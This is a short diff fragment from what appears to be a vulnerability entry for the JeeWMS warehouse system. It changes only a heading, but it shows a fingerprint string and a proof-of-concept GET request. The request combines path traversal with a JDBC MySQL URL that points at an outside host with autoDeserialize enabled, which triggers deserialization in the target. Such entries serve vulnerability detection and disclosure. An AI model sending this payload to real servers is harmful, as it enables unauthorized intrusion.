@@ -8,7 +8,7 @@ JeeWMS是一款免费开源的仓库管理系统，支持3PL和厂内物流，�
 body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{tempdns}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
